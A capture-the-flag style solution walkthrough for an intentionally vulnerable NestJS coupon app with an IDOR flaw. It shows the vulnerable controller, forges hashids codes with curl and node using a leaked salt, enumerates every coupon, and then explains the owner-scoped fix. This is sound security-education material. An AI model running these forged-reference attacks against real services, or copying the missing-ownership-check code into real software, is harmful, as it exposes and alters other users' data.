# couponly: Solution / Walkthrough

![CWE-639](https://img.shields.io/badge/CWE--639-IDOR-red?style=flat-square)
![Node](https://img.shields.io/badge/Node-NestJS-E0234E?style=flat-square&logo=nestjs&logoColor=white)
![Docker](https://img.shields.io/badge/Lab-Docker-2496ED?style=flat-square&logo=docker&logoColor=white)

**couponly is an intentionally vulnerable application built for security education.** It contains a deliberate [IDOR / broken access control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
(CWE-639) flaw so you can practice finding and exploiting it in a safe and controlled environment.

<br>

> [!WARNING]
> This page gives away the exploit and the flag. If you want to solve it yourself, start with the non-spoiler **[Learning Guide](GUIDE.md)** and come back here to check your work.

<br>

## 📚 What you'll get from this page

The [Learning Guide](GUIDE.md) covers *what* broken access control is and *how*
to approach the lab. This page is the spoiler half: the confirmed exploit, the
flag, and — most importantly — the **why** behind the bug and its fix. By the
end you should be able to:

- Read a NestJS controller and point to the exact missing check.
- Reproduce the exploit by hand, understanding how the code is forged.
- Explain **why** hashids-encoding the id did not fix anything.

> **One-line recap** (full version in the [GUIDE](GUIDE.md)): an IDOR happens
> when an app acts on an object by a client-supplied reference without checking
> the object belongs to the caller. A hashids code raises the cost of *guessing*
> the reference — it does nothing about *authorization*, and it is reversible
> the moment its salt leaks.

<br>

## 🐛 The vulnerability

Coupons are addressed by a hashids `code`. The controller in
`src/coupons/coupons.controller.ts` decodes the code to an id and then acts on
it — three times, each with **no ownership check**:

```ts
@Controller('api')
@UseGuards(AuthGuard)                       // session required — authentication only
export class CouponsController {
  // ⚠️ READ IDOR
  @Get('coupons/:code')
  async getOne(@Param('code') code: string) {
    const id = decodeId(code);
    if (id === null) throw new BadRequestException('malformed coupon code');
    const coupon = await this.coupons.findById(id);      // by id ONLY — no owner filter
    if (!coupon) throw new NotFoundException('coupon not found');
    return { coupon };
  }

  // ⚠️ WRITE IDOR (redeem)
  @Post('coupons/:code/redeem')
  async redeem(@Param('code') code: string) { /* decode → redeem(id) */ }

  // ⚠️ WRITE IDOR (modify)
  @Patch('coupons/:code')
  async modify(@Param('code') code: string, @Body() body: ModifyCouponDto) { /* decode → modify(id) */ }
}
```

and the service (`src/coupons/coupons.service.ts`):

```ts
async findById(id: number) {
  const [row] = await db.select().from(coupons).where(eq(coupons.id, id)).limit(1);
  return row ? toView(row) : undefined;    // looked up by id ONLY — no owner filter
}
```

Walk through it the way the server does:

1. `AuthGuard` ensures there **is** a session — authentication. It says nothing
   about *which* coupons you may touch.
2. `decodeId(code)` turns the hashids code back into an integer id. So this is
   not about malformed input — a valid code sails straight through.
3. The query filters by `coupons.id = id` and **nothing else**. There is no
   `AND owner_id = <session user>`.
4. The handler reads / redeems / modifies whatever row matched. Any logged-in
   user can act on any coupon — if they know its code.

And here is the enabler — a "bootstrap config" endpoint
(`src/config.controller.ts`) that **leaks the hashids salt** to anyone, no
session required:

```ts
@Get('config')
clientConfig() {
  return {
    hashids: {
      salt: config.hashidsSalt,            // ← the one secret that makes codes reversible
      minLength: config.hashidsMinLength,
    },
    brand: 'couponly',
    currency: 'EUR',
  };
}
```

> **Why does it look safe?** The codes are short and opaque, so the team "felt"
> the coupons were unguessable and skipped the ownership check. But `/api/config`
> hands out the salt, and hashids is reversible — so the codes were never secret
> at all. Obfuscation bought nothing.

<br>

## 💥 Exploitation

You log in as **alice** (`password123`). You cannot guess bob's premium coupon
code — but `/api/config` tells you exactly how codes are built.

With `curl`, using a cookie jar to hold the session:

```bash
# 1) The leak — the public config endpoint exposes the hashids salt (no auth).
curl -s http://localhost:3000/api/config
# {"hashids":{"salt":"couponly-2026","minLength":6},"brand":"couponly","currency":"EUR"}

# 2) Log in as alice and save the session cookie.
curl -s -c jar.txt -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"password123"}' \
  http://localhost:3000/api/login

# 3) See your own coupons — note the short codes, all owned by you.
curl -s -b jar.txt http://localhost:3000/api/coupons
```

Now rebuild the codec with the leaked salt and forge codes for the first few
ids. Your own coupons are ids 1–2; try their neighbours:

```bash
node -e "const H=require('hashids').default||require('hashids');\
const h=new H('couponly-2026',6);\
for(let i=1;i<=6;i++) console.log(i, h.encode(i));"
# 1 K0pqY2
# 2 K0GnXa
# 3 3YW8wn
# 4 30ExX6   ← bob's premium coupon
# 5 4wJMY9
# 6 OXjk05
```

```bash
# 4) READ IDOR — read bob's coupon by the forged code. Not yours, returned anyway.
curl -s -b jar.txt http://localhost:3000/api/coupons/30ExX6
```

Expected output (step 4), with the flag as the coupon code:

```json
{
  "coupon": {
    "code": "30ExX6",
    "title": "Premium partner coupon",
    "couponCode": "FLAG{COUPONLY_UNHASHED_THE_ID}",
    "discountPct": 90,
    "redeemed": false,
    "expiresAt": "2027-06-30T23:59:59.000Z",
    "owner": 2
  }
}
```

The write endpoints work on the same forged code — you can burn or rewrite a
coupon you don't own:

```bash
# 5) WRITE IDOR (redeem) — burn bob's coupon.
curl -s -b jar.txt -X POST http://localhost:3000/api/coupons/30ExX6/redeem

# 6) WRITE IDOR (modify) — crank the discount and rename it.
curl -s -b jar.txt -X PATCH -H 'Content-Type: application/json' \
  -d '{"discountPct":99,"title":"pwned by alice"}' \
  http://localhost:3000/api/coupons/30ExX6
```

> **Where does the flag come from?** It is **not** in the repo on purpose — it is
> baked into the Docker image at build time (`ARG FLAG`) and the seed writes it
> into bob's coupon (`owner: 2`) as its code. You have to actually break access
> control against the running app to read it; you can't grep the source.

<br>

## 🚀 Going further

The endpoints act on *any* valid code, so the real exposure is every coupon in
the system — just encode the whole id space and read each one:

```bash
# Forge codes for ids 1..50 and read each coupon.
for i in $(seq 1 50); do
  code=$(node -e "const H=require('hashids').default||require('hashids');\
console.log(new H('couponly-2026',6).encode($i))")
  echo "== id $i ($code) =="
  curl -s -b jar.txt "http://localhost:3000/api/coupons/$code"
  echo
done
```

In a real engagement the salt might leak through a JS bundle, a mobile app, an
error message, or just be short enough to brute-force offline. The lesson is
identical: once the encoding is known, a missing ownership check exposes every
object.

<br>

## 🛠️ Doing it in Burp Suite

Prefer a proxy-driven workflow? This mirrors a real engagement:

1. Proxy your browser through Burp and load <http://localhost:3000>. In **Proxy >
   HTTP history** find `GET /api/config` — the response hands you the hashids
   `salt` and `minLength`.
2. Log in as `alice`. Take a `GET /api/coupons/<your-own-code>` request to
   **Repeater** as a baseline.
3. Rebuild the codec (a tiny script, or Burp's **Hackvertor** extension, or any
   online hashids tool) using the leaked salt. Encode `4` → `30ExX6`.
4. Swap your code for `30ExX6` in Repeater and send. A different coupon body —
   with the flag — confirms the read IDOR. Then change the method to `POST
   …/redeem` and `PATCH …` to confirm the write IDORs.
5. (Optional) Send `/api/coupons/:code` to **Intruder** with a payload list of
   forged codes for ids `1..N` to dump every coupon at once.

> Testing IDOR well means having **two identities**. Proving a coupon owned by
> bob is readable *and writable* while authenticated as alice is the proof of a
> broken authorization check — regardless of how opaque the code looks.

<br>

## 🛡️ The fix

Two things are wrong: the endpoints don't authorize, and the config endpoint
over-shares. Fix both.

**1. Scope every access to the owner (kills the IDOR).** Make the query itself
refuse other people's rows, so the check can't be forgotten:

```ts
// service: look up by id AND owner in one query (same pattern for redeem/modify).
async findOwnedById(id: number, userId: number) {
  const [row] = await db
    .select()
    .from(coupons)
    .where(and(eq(coupons.id, id), eq(coupons.ownerId, userId)))
    .limit(1);
  return row ? toView(row) : undefined;
}

// controller: pass the session user, and 404 for anything not yours.
@Get('coupons/:code')
async getOne(
  @Param('code') code: string,
  @Req() req: Request & { session: SessionData },
) {
  const id = decodeId(code);
  if (id === null) throw new BadRequestException('malformed coupon code');
  const coupon = await this.coupons.findOwnedById(id, req.session.userId!);
  if (!coupon) throw new NotFoundException('coupon not found');  // 404, don't leak existence
  return { coupon };
}
```

Apply the same owner-scoped `UPDATE … WHERE id = :id AND owner_id = :me` to the
redeem and modify endpoints so a forged code touches zero rows.

**2. Stop the config endpoint leaking the salt.** The front-end never needs the
salt: either render coupon codes **server-side** and send the finished strings,
or drop the salt from `/api/config` entirely. A secret that makes server-side
ids reversible must never reach the client.

Why this works: being logged in is necessary but not sufficient; every object
access re-checks ownership, the query can't return (or write) someone else's
row, and `404` (not `403`) means an attacker can't even confirm a coupon exists.

### ⚠️ Tempting fixes that *don't* work

Part of learning is knowing which "fixes" are traps:

- **"We encode ids with hashids, so we're safe."** This is the whole point of the
  level. Obfuscated ≠ authorized. A forged code is just as exploitable as `id=4`.
- **Making the salt longer / rotating it.** Still obscurity, not authorization —
  and it fails the instant the salt leaks again (and salts leak: bundles, apps,
  logs). The fix is the ownership check, not a better secret.
- **Removing the salt from `/api/config` but leaving the endpoints open.** That
  closes *one* leak channel; the salt can leak elsewhere or be brute-forced.
  Plug the authorization hole, not just one faucet.
- **Checking only that the user is logged in.** That's what the broken code
  already does. Authentication ≠ authorization.

<br>

## 🎓 Key takeaways

If you remember five things from this lab, make it these:

1. **The id format is irrelevant to authorization.** Sequential, UUID, base64,
   hashid — none of them decide *who may access the object*.
2. **Encodings are reversible; only authorization isn't.** A hashid is a two-way
   function keyed by a short, leak-prone salt — never treat it as a secret.
3. **Authorize every object access on the server, every time, and fail closed.**
4. **Scope at the source.** `WHERE id = :id AND owner_id = :me` makes "forgot the
   check" structurally impossible — on reads *and* writes.
5. **Never ship server-side secrets to the client.** A "bootstrap config" that
   leaks the id-encoding salt is a classic enabler — keep encoding on the server.

That's Level 5 — IDOR on a reversibly-obfuscated id. Previously,
**[snapvault (Level 4)](https://github.com/iv0ks/snapvault)** wrapped the id in
**base64** — decode, alter, re-encode. Next in the series,
**[tasknest (Level 6)](https://github.com/iv0ks/tasknest)** moves from a single
object to **tenant isolation** — crossing the boundary between whole accounts.
Head back to the **[Learning Guide](GUIDE.md)** for the method, or the
**[README](README.md)** for the lab setup.

<br>

> **Legal / ethics.** This is an educational, deliberately vulnerable lab. Run it
> only locally, on owned, isolated infrastructure, and never use these techniques
> against systems without explicit written authorization.
